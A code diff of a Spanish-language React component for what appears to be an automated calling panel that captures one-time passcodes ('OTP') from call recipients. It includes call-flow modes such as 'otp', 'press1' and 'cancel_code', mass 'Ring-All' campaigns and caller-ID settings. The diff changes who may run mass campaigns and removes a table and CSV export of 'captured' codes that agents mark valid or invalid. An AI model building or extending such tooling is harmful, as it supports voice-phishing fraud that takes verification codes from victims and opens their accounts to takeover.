@@ -19,7 +19,6 @@ import {
   Check,
   RefreshCw,
   Trash2,
-  Download,
   KeyRound,
   AlertCircle,
   Building2,
@@ -163,12 +162,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const isSuperAdmin = isAdmin && !activeUser?.tenantId;
   const isAgent = activeUser ? activeUser.role === 'agent' : false;
   const isSupervisor = activeUser ? activeUser.role === 'supervisor' : false;
-  const canRunMassCalls = Boolean(
-    activeUser &&
-      (activeUser.role === 'admin' ||
-        activeUser.role === 'supervisor' ||
-        activeUser.role === 'reseller_client')
-  );
 
   // User assigned extension: Si un usuario tiene extensión asignada, sus llamadas individuales retornan EXCLUSIVAMENTE a su extensión
   const userAssignedExt = (activeUser?.assignedExtensions && activeUser.assignedExtensions.length > 0)
@@ -208,19 +201,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Mode selection: disparador individual (1 a 1 hacia asesor asignado), acción IVR y centro de llamadas masivas (Ring-All a todas las extensiones)
   const [productionMode, setProductionMode] = useState<'single' | 'ivr_action' | 'mass_campaign'>('single');
 
-  useEffect(() => {
-    if (!canRunMassCalls && productionMode === 'mass_campaign') {
-      setProductionMode('single');
-    }
-    if (!isSuperAdmin && productionMode === 'ivr_action') {
-      setProductionMode('single');
-    }
-  }, [canRunMassCalls, isSuperAdmin, productionMode]);
-
   const ALL_CALL_FLOW_MODES: CallFlowMode[] = ['otp', 'press1', 'hybrid', 'cancel_code', 'otp_press1'];
   const [serverAssignedFlowMode, setServerAssignedFlowMode] = useState<CallFlowMode | null>(null);
   const [serverAllowedFlowModes, setServerAllowedFlowModes] = useState<CallFlowMode[] | null>(null);
+  const [serverCanUseMassCalls, setServerCanUseMassCalls] = useState<boolean | null>(null);
   const allowedFlowModesRef = useRef<CallFlowMode[]>(ALL_CALL_FLOW_MODES);
+
+  useEffect(() => {
+    setServerCanUseMassCalls(null);
+  }, [activeUser?.id]);
 
   // Single launch state
   const [targetNumber, setTargetNumber] = useState('16104803845');
@@ -804,6 +793,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         if (cleanAllowed.length > 0) {
           setServerAllowedFlowModes(cleanAllowed);
         }
+      }
+      if (typeof data.canUseMassCalls === 'boolean') {
+        setServerCanUseMassCalls(data.canUseMassCalls);
       }
 
       if (data.success && data.workspace) {
@@ -1639,6 +1631,25 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   }, [isSuperAdmin, campaignEntities, effectiveAssignedEntityIds]);
 
   const canEditEntityCatalog = isSuperAdmin || (isAdmin && !userTenant);
+
+  // Centro de Llamadas Masivas: solo disponible para Super Administrador o clientes habilitados explícitamente por el Administrador
+  const canRunMassCalls = React.useMemo(() => {
+    if (isSuperAdmin) return true;
+    if (!activeUser) return false;
+    if (activeUser.permissions?.canUseMassCalls === true) return true;
+    if (userTenant?.allowMassCalls === true && activeUser.role !== 'agent') return true;
+    if (serverCanUseMassCalls === true) return true;
+    return false;
+  }, [isSuperAdmin, activeUser, userTenant?.allowMassCalls, serverCanUseMassCalls]);
+
+  useEffect(() => {
+    if (!canRunMassCalls && productionMode === 'mass_campaign') {
+      setProductionMode('single');
+    }
+    if (!isSuperAdmin && productionMode === 'ivr_action') {
+      setProductionMode('single');
+    }
+  }, [canRunMassCalls, isSuperAdmin, productionMode]);
 
   // Planes de marcación asignados por el Super Administrador (el cliente solo puede usar los autorizados)
   const adminAllowedCallFlowModes = React.useMemo<CallFlowMode[]>(() => {
@@ -2763,24 +2774,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     } catch (e) {}
   };
 
-  // Export CSV
-  const handleExportCsv = () => {
-    if (otpRecords.length === 0) return;
-    const headers = 'ID,Numero_Destino,Codigo_OTP,Servicio,Hora,Estado\n';
-    const rows = otpRecords
-      .map(
-        (r) =>
-          `"${r.id}","${r.number}","${r.otp}","${r.service || 'N/A'}","${r.timestamp}","${r.status || 'valid'}"`
-      )
-      .join('\n');
-    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
-    const url = URL.createObjectURL(blob);
-    const link = document.createElement('a');
-    link.setAttribute('href', url);
-    link.setAttribute('download', `capturas_otp_produccion_${new Date().toISOString().slice(0, 10)}.csv`);
-    link.click();
-  };
-
   // Format seconds into MM:SS
   const formatTime = (secs: number) => {
     const m = Math.floor(secs / 60);
@@ -2865,7 +2858,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const handleStartMassCampaign = async () => {
     if (!canRunMassCalls) {
       setLaunchFeedback({
-        text: 'Solo el Administrador del Call Center o Super Administrador puede ejecutar campañas de Llamadas Masivas.',
+        text: 'Acceso restringido: Solo el Administrador puede habilitar el Centro de Llamadas Masivas para clientes.',
         type: 'error',
       });
       return;
@@ -2932,6 +2925,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           tenantExtensions: tenantScopedExtensions,
           isAdmin: isSuperAdmin,
           isSuperAdmin,
+          isMassCampaign: true,
           callerId: outboundCid,
           callerIdNum: outboundCid,
           callerIdName: outboundCid ? String(activeCarrierObj?.outboundCallerName || '').trim() : '',
@@ -6605,200 +6599,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           </div>
         </div>
       )}
-
-      {/* HISTORICAL TABLE OF CAPTURED OTPS */}
-      <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
-        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-          <div>
-            <div className="flex items-center gap-2 flex-wrap">
-              <h3 className="text-base font-bold text-white flex items-center gap-2">
-                <KeyRound className="w-5 h-5 text-emerald-400" />
-                <span>Registro de Códigos OTP Producidos</span>
-                <span className="px-2 py-0.5 text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 rounded-full border border-emerald-500/30">
-                  {otpRecords.length}
-                </span>
-              </h3>
-              {currentUser?.tenantId ? (
-                <span className="px-2.5 py-0.5 text-[11px] font-mono font-bold bg-indigo-500/20 text-indigo-300 rounded-full border border-indigo-500/30 flex items-center gap-1.5 shadow-sm">
-                  <Building2 className="w-3.5 h-3.5 text-indigo-400" />
-                  <span>Base Aislada: {tenants.find((t) => t.id === currentUser.tenantId)?.name || currentUser.tenantId}</span>
-                </span>
-              ) : (
-                <span className="px-2.5 py-0.5 text-[11px] font-mono font-semibold bg-slate-800 text-slate-300 rounded-full border border-slate-700 flex items-center gap-1.5">
-                  <span>🌐 Base de Datos Global (Todos los Call Centers)</span>
-                </span>
-              )}
-              {activeUser?.assignedExtensions && activeUser.assignedExtensions.length > 0 && (
-                <span className="px-2.5 py-0.5 text-[11px] font-mono font-bold bg-emerald-500/15 text-emerald-300 rounded-full border border-emerald-500/30 flex items-center gap-1">
-                  <UserCheck className="w-3.5 h-3.5 text-emerald-400" />
-                  <span>Solo Ext: {activeUser.assignedExtensions.join(', ')}</span>
-                </span>
-              )}
-            </div>
-            <p className="text-xs text-slate-400 mt-1">
-              Almacén en vivo de todos los códigos capturados en llamadas salientes {currentUser?.tenantId ? 'exclusivo para su Call Center' : 'para el sistema general'}.
-            </p>
-          </div>
-
-          <div className="flex items-center gap-2">
-            <button
-              id="btn-refresh-otp-records"
-              onClick={() => fetchCapturedOtps(true)}
-              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 transition-all cursor-pointer"
-            >
-              <RefreshCw className="w-3.5 h-3.5" />
-              <span>Actualizar</span>
-            </button>
-
-            <button
-              id="btn-export-otp-csv"
-              onClick={handleExportCsv}
-              disabled={otpRecords.length === 0}
-              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-emerald-400 border border-slate-800 disabled:opacity-40 transition-all"
-            >
-              <Download className="w-3.5 h-3.5" />
-              <span>Exportar CSV</span>
-            </button>
-
-            <button
-              id="btn-clear-otp-history"
-              onClick={handleClearHistory}
-              disabled={otpRecords.length === 0}
-              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 disabled:opacity-40 transition-all"
-            >
-              <Trash2 className="w-3.5 h-3.5" />
-              <span>Vaciar</span>
-            </button>
-          </div>
-        </div>
-
-        {/* OTP Table */}
-        <div className="overflow-x-auto rounded-xl border border-slate-800">
-          <table className="w-full text-left border-collapse text-xs">
-            <thead>
-              <tr className="bg-slate-900/80 border-b border-slate-800 text-slate-400 font-mono">
-                <th className="p-3">Hora</th>
-                <th className="p-3">Número Destino</th>
-                <th className="p-3">Servicio / Extensión</th>
-                <th className="p-3">Código OTP Capturado</th>
-                <th className="p-3">Decisión del Agente (Válido/Inválido)</th>
-                <th className="p-3 text-right">Acciones</th>
-              </tr>
-            </thead>
-            <tbody className="divide-y divide-slate-800/60">
-              {otpRecords.length === 0 ? (
-                <tr>
-                  <td colSpan={6} className="p-8 text-center text-slate-500">
-                    <KeyRound className="w-8 h-8 mx-auto mb-2 opacity-30" />
-                    <span>No hay códigos OTP capturados todavía. Lanza tu primera llamada de producción.</span>
-                  </td>
-                </tr>
-              ) : (
-                otpRecords.map((record) => (
-                  <tr key={record.id} className="hover:bg-slate-900/40 transition-colors">
-                    <td className="p-3 text-slate-400 font-mono">{record.timestamp}</td>
-                    <td className="p-3 font-mono font-bold text-white">{record.number}</td>
-                    <td className="p-3 text-slate-300">
-                      <div className="flex items-center gap-1.5 flex-wrap">
-                        <span>{record.service || 'Servicio al Cliente'}</span>
-                        {record.agent && (
-                          <span className="px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30 font-mono text-[10px] font-bold">
-                            Ext. {record.agent}
-                          </span>
-                        )}
-                      </div>
-                    </td>
-                    <td className="p-3">
-                      <span className="inline-flex items-center px-3 py-1 rounded-lg bg-emerald-500/20 border border-emerald-500/40 font-mono text-sm font-black text-emerald-300 tracking-wider">
-                        {record.otp}
-                      </span>
-                    </td>
-                    <td className="p-3">
-                      <div className="space-y-1.5">
-                        <div>
-                          {record.status === 'valid' ? (
-                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/30 text-[10px]">
-                              <CheckCircle className="w-3 h-3 text-emerald-400" />
-                              <span>VÁLIDO (Aprobado)</span>
-                            </span>
-                          ) : record.status === 'invalid' ? (
-                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/30 text-[10px]">
-                              <XCircle className="w-3 h-3 text-rose-400" />
-                              <span>INVÁLIDO (Rechazado)</span>
-                            </span>
-                          ) : (
-                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 font-medium border border-amber-500/30 text-[10px]">
-                              <Clock className="w-3 h-3 text-amber-400" />
-                              <span>Pendiente Revisión</span>
-                            </span>
-                          )}
-                        </div>
-
-                        {/* Botones rápidos para que el agente marque el estado */}
-                        <div className="flex items-center gap-1.5">
-                          <button
-                            type="button"
-                            onClick={() => handleVerifyOtp('valid', record.otp, record.number, record.id)}
-                            title="Marcar este código como Válido"
-                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
-                              record.status === 'valid'
-                                ? 'bg-emerald-500 text-slate-950 ring-2 ring-emerald-400/50'
-                                : 'bg-slate-800 hover:bg-emerald-500/20 text-emerald-300 border border-slate-700'
-                            }`}
-                          >
-                            <Check className="w-3 h-3" />
-                            <span>Válido</span>
-                          </button>
-
-                          <button
-                            type="button"
-                            onClick={() => handleVerifyOtp('invalid', record.otp, record.number, record.id)}
-                            title="Marcar este código como Inválido"
-                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
-                              record.status === 'invalid'
-                                ? 'bg-rose-500 text-white ring-2 ring-rose-400/50'
-                                : 'bg-slate-800 hover:bg-rose-500/20 text-rose-300 border border-slate-700'
-                            }`}
-                          >
-                            <XCircle className="w-3 h-3" />
-                            <span>Inválido</span>
-                          </button>
-                        </div>
-                      </div>
-                    </td>
-                    <td className="p-3 text-right">
-                      <div className="inline-flex items-center gap-1.5">
-                        <button
-                          onClick={() => handleCopyOtp(record.otp, record.id)}
-                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-slate-800 hover:bg-slate-700 text-white transition-all"
-                        >
-                          {copiedId === record.id ? (
-                            <Check className="w-3.5 h-3.5 text-emerald-400" />
-                          ) : (
-                            <Copy className="w-3.5 h-3.5 text-slate-400" />
-                          )}
-                          <span>{copiedId === record.id ? 'Copiado' : 'Copiar'}</span>
-                        </button>
-
-                        <button
-                          onClick={() => {
-                            setTargetNumber(record.number);
-                            window.scrollTo({ top: 0, behavior: 'smooth' });
-                          }}
-                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 transition-all"
-                        >
-                          <PhoneCall className="w-3.5 h-3.5" />
-                          <span>Re-llamar</span>
-                        </button>
-                      </div>
-                    </td>
-                  </tr>
-                ))
-              )}
-            </tbody>
-          </table>
-        </div>
-      </div>
 
       {/* MODAL: SUBIDA / GRABACIÓN RÁPIDA DE AUDIO PARA LA CAMPAÑA */}
       {isQuickUploadOpen && (
